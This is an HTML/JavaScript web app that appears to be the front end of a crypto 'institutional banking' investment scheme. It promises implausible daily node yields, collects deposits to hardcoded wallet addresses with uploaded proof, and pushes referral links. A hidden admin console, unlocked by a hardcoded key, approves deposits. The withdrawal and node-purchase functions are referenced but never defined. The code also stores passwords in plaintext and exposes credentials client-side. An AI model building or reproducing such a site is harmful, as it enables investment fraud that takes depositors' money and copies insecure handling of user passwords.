<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS APEX ELITE | Institutional Banking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --primary: #000000; --accent: #2563eb; --emerald: #059669; }
        body { background: #f8fafc; color: #0f172a; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; }
        
        .glass-card { background: #ffffff; border: 1px solid rgba(0,0,0,0.05); border-radius: 28px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.03); }
        .btn-apex { background: var(--primary); color: #fff; border-radius: 16px; font-weight: 800; padding: 18px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 12px; letter-spacing: 1.5px; }
        .btn-apex:active { transform: scale(0.96); }
        .input-apex { background: #f1f5f9; border: 1px solid transparent; border-radius: 16px; padding: 16px; width: 100%; outline: none; transition: 0.2s; font-size: 14px; font-weight: 600; }
        .input-apex:focus { border-color: var(--accent); background: #fff; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.08); }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; transition: 0.3s; }
        .nav-link.active { color: var(--primary); }
        
        .status-badge { padding: 4px 12px; border-radius: 8px; font-size: 10px; font-weight: 900; text-transform: uppercase; }
        .cleared { background: #dcfce7; color: #15803d; }
        .pending { background: #fef3c7; color: #b45309; }

        #loader { position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .page-anim { animation: pageIn 0.5s ease-out; }
        @keyframes pageIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="loader"><div class="w-12 h-12 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div></div>

    <div id="auth-screen" class="min-h-screen flex items-center justify-center p-8">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-4xl font-black tracking-tighter uppercase italic">Nexus<span class="text-blue-600">Apex</span></h1>
                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-[7px] mt-3">Sovereign Financial Terminal</p>
            </div>

            <div id="login-box" class="glass-card p-10 space-y-5">
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-apex">
                <input type="password" id="l-pass" placeholder="Security Passcode" class="input-apex">
                <button onclick="login()" class="btn-apex">Authorize Session</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase mt-4">No Credentials? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register Profile</span></p>
            </div>

            <div id="signup-box" class="glass-card p-10 space-y-5 hidden">
                <input type="text" id="s-user" placeholder="Set Identity" class="input-apex">
                <input type="password" id="s-pass" placeholder="Set Passcode" class="input-apex">
                <button onclick="signup()" class="btn-apex">Initialize Access</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase mt-4">Already Member? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Return to Login</span></p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-36">
        <header class="p-6 sticky top-0 z-50 bg-white/80 backdrop-blur-2xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-black text-white rounded-2xl flex items-center justify-center text-xl font-black italic">A</div>
                <div>
                    <p id="user-display" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <div class="flex items-center gap-2"><span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span><p class="text-[9px] font-bold text-slate-400 uppercase">Institutional Secure</p></div>
                </div>
            </div>
            <button onclick="exit()" class="w-11 h-11 rounded-xl bg-slate-50 text-slate-400 flex items-center justify-center"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="view-home" class="p-6 space-y-6 page-anim">
            <div class="glass-card p-8 relative overflow-hidden border-none shadow-xl">
                <div class="relative z-10 space-y-8">
                    <div>
                        <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Total Equity Value</p>
                        <h2 id="bal-txt" class="text-4xl font-black mt-2 tracking-tighter text-slate-900">$0.00</h2>
                    </div>
                    <div class="flex justify-between items-end border-t border-slate-50 pt-6">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase">24H Net Yield</p>
                            <p id="prof-txt" class="text-2xl font-bold text-emerald-600">+$0.00</p>
                        </div>
                        <button onclick="copyRef()" class="bg-blue-600 text-white px-5 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-tighter">Share Portal</button>
                    </div>
                </div>
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-blue-50 rounded-full blur-[80px]"></div>
            </div>

            <div class="glass-card p-5 flex gap-3 items-center">
                <div class="w-10 h-10 bg-slate-50 text-slate-900 rounded-full flex items-center justify-center font-bold">%</div>
                <input type="text" id="promo-input" placeholder="Enter Grant Code" class="bg-transparent border-none outline-none flex-1 font-bold text-xs">
                <button onclick="redeemPromo()" class="text-blue-600 font-black text-[10px] uppercase border-l pl-4">Apply</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[4px] ml-2">Active Protocols</h3>
            <div id="active-nodes" class="space-y-4"></div>
        </main>

        <main id="view-nodes" class="p-6 space-y-6 hidden page-anim">
            <h3 class="text-sm font-black uppercase border-l-4 border-blue-600 pl-4">Elite Assets</h3>
            <div id="nodes-elite" class="grid gap-4"></div>
            <h3 class="text-sm font-black uppercase border-l-4 border-slate-200 pl-4 mt-10">Retail Assets</h3>
            <div id="nodes-standard" class="grid gap-4"></div>
        </main>

        <main id="view-bank" class="p-6 space-y-6 hidden page-anim">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Deposit</h3>
                <select id="dep-select" class="input-apex font-black" onchange="showDepUI()">
                    <option value="">Select Asset Network</option>
                    <option value="TRX">TRX (Trust Wallet)</option>
                    <option value="ETH">ETH (Metamask)</option>
                    <option value="USDT">USDT (Binance TRC20)</option>
                </select>
                <div id="dep-ui" class="hidden space-y-5 border-t pt-6">
                    <div class="bg-slate-50 p-5 rounded-2xl border border-slate-200 text-center">
                        <p id="dep-addr-text" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="dep-amount" placeholder="Amount ($)" class="input-apex">
                    <input type="text" id="dep-hash" placeholder="Transaction ID (TID)" class="input-apex">
                    <input type="file" id="dep-file" class="text-[10px] font-bold">
                    <button onclick="executeDeposit()" class="btn-apex shadow-xl shadow-blue-600/10">Finalize Deposit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Withdrawal</h3>
                <select id="with-gateway" class="input-apex font-black">
                    <option value="">Choose Payout Method</option>
                    <option value="Binance">Binance</option><option value="Trust">Trust Wallet</option><option value="Metamask">Metamask</option>
                    <option value="OKX">OKX</option><option value="ByBit">ByBit</option><option value="Coinbase">Coinbase</option><option value="Wire">Bank Wire</option>
                </select>
                <input type="number" id="with-amount" placeholder="Amount ($)" class="input-apex">
                <input type="text" id="with-address" placeholder="Destination Address" class="input-apex">
                <button onclick="executeWithdraw()" class="btn-apex !bg-slate-800">Request Payout</button>
            </div>
        </main>

        <main id="view-history" class="p-6 space-y-4 hidden page-anim">
            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Ledger Statement</h3>
            <div id="history-data" class="space-y-3"></div>
        </main>

        <nav class="fixed bottom-8 left-6 right-6 h-20 glass-card shadow-2xl flex justify-around items-center px-4 z-[1000]">
            <div onclick="navigate('home')" class="nav-link active"><i class="fa-solid fa-compass text-2xl"></i><p class="mt-1">Terminal</p></div>
            <div onclick="navigate('nodes')" class="nav-link"><i class="fa-solid fa-vault text-2xl"></i><p class="mt-1">Assets</p></div>
            <div onclick="navigate('bank')" class="nav-link"><i class="fa-solid fa-paper-plane text-2xl"></i><p class="mt-1">Transfer</p></div>
            <div onclick="navigate('history')" class="nav-link"><i class="fa-solid fa-receipt text-2xl"></i><p class="mt-1">Ledger</p></div>
        </nav>
    </div>

    <div id="admin-view" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b pb-6">
            <h2 class="text-sm font-black uppercase tracking-widest">Master Console</h2>
            <button onclick="document.getElementById('admin-view').classList.add('hidden')" class="text-5xl font-thin">&times;</button>
        </div>
        <div id="admin-pending" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeCatalog = {
            elite: [
                { id: 701, name: "Apex Alpha Node", price: 3500, daily: 380, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 702, name: "Apex Omega Node", price: 8000, daily: 950, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=400" }
            ],
            standard: Array.from({length: 6}, (_, i) => ({
                id: i+1, name: `Retail Protocol v${i+1}`, price: 100 + (i*180), daily: 14 + (i*15), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderCatalog();
            setTimeout(() => document.getElementById('loader').style.display='none', 1000);
            const user = localStorage.getItem('apex_user');
            if(user) bootTerminal(user);
        };

        function renderCatalog() {
            const ui = (n) => `
                <div class="glass-card overflow-hidden flex items-center h-28 border-none shadow-xl shadow-slate-100">
                    <img src="${n.img}" class="w-28 h-28 object-cover">
                    <div class="px-6 flex-1">
                        <h4 class="text-[11px] font-black uppercase tracking-tighter">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600 mt-1">24H Yield: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-base font-black">$${n.price}</span>
                            <button onclick="deploy(${n.id})" class="bg-black text-white text-[9px] font-black px-5 py-2 rounded-xl uppercase">Deploy</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('nodes-elite').innerHTML = nodeCatalog.elite.map(ui).join('');
            document.getElementById('nodes-standard').innerHTML = nodeCatalog.standard.map(ui).join('');
        }

        function bootTerminal(uid) {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('user-display').innerText = `ID: ${uid}`;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('bal-txt').innerText = '$' + (data.balance || 0).toFixed(2);
                document.getElementById('prof-txt').innerText = '+$' + (data.profit || 0).toFixed(2);
                
                const active = data.nodes ? Object.entries(data.nodes) : [];
                document.getElementById('active-nodes').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-4 border-blue-600 shadow-xl shadow-slate-50">
                        <div><p class="text-[11px] font-black uppercase tracking-tighter">${v.name}</p><p class="text-[9px] text-slate-400 font-bold uppercase mt-1">Operational Yielding</p></div>
                        <div class="text-right">
                            <span class="text-xs font-mono font-black bg-slate-100 px-4 py-2 rounded-xl clock" data-next="${v.nextClaim}">00:00:00</span>
                        </div>
                    </div>`).join('') || '<div class="text-center py-20 text-[10px] font-black text-slate-300 uppercase tracking-widest italic">No Nodes Active</div>';

                const history = data.history ? Object.entries(data.history).reverse() : [];
                document.getElementById('history-data').innerHTML = history.map(([k, h]) => `
                    <div class="glass-card p-5 flex justify-between items-center border-none shadow-sm">
                        <div><p class="text-[11px] font-black uppercase tracking-tighter">${h.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><span class="status-badge ${h.status.toLowerCase()}">${h.status}</span></div>
                    </div>`).join('');
            });
        }

        window.redeemPromo = async () => {
            const code = document.getElementById('promo-input').value.trim();
            const rewards = { "APEX100": 100, "ELITE500": 500, "GRANT": 50 };
            if(rewards[code]) {
                const uid = localStorage.getItem('apex_user');
                const s = await get(ref(db, `users/${uid}`));
                await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + rewards[code] });
                alert(`Grant Authorized: $${rewards[code]} settled.`);
                document.getElementById('promo-input').value = "";
            } else alert("Invalid Institutional Code.");
        };

        window.executeDeposit = () => {
            const file = document.getElementById('dep-file').files[0];
            if(!file) return alert("Proof file required.");
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const uid = localStorage.getItem('apex_user'), hKey = push(ref(db, 'admin/requests')).key;
                const req = { id: hKey, user: uid, amount: document.getElementById('dep-amount').value, tid: document.getElementById('dep-hash').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), req);
                await set(ref(db, `users/${uid}/history/${hKey}`), req);
                alert("Audit Initiated.");
                navigate('history');
            };
        };

        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('admin-view').classList.remove('hidden'); loadAdmin(); } taps = 0; } };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-pending').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-6 space-y-4 shadow-2xl">
                        <div class="flex justify-between font-black text-[11px] uppercase tracking-tighter"><span>${r.type} | User: ${r.user}</span><span>$${r.amount}</span></div>
                        <img src="${r.proof}" class="w-full h-48 object-cover rounded-2xl border">
                        <div class="flex gap-2">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-apex !bg-emerald-600 flex-1">Approve</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-apex !bg-rose-600 flex-1">Decline</button>
                        </div>
                    </div>`).join('') : '<p class="text-center font-bold text-slate-300">No Pending Audits</p>';
            });
        }

        window.audit = async (id, user, amt, status) => {
            if(status === 'Cleared') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.navigate = (p) => { ['home','nodes','bank','history'].forEach(x => document.getElementById('view-'+x).classList.add('hidden')); document.getElementById('view-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.showDepUI = () => {
            const m = document.getElementById('dep-select').value;
            const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "ETH": "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" };
            document.getElementById('dep-addr-text').innerText = map[m] || "";
            document.getElementById('dep-ui').classList.remove('hidden');
        };

        window.login = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('apex_user', u); bootTerminal(u); } else alert("Access Denied."); };
        window.signup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.exit = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.href + "?id=" + localStorage.getItem('apex_user')); alert("Portal Referral Link Copied."); };

        setInterval(() => {
            document.querySelectorAll('.clock').forEach(el => {
                const diff = parseInt(el.dataset.next) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Syncing...";
            });
        }, 1000);
    </script>
</body>
</html>
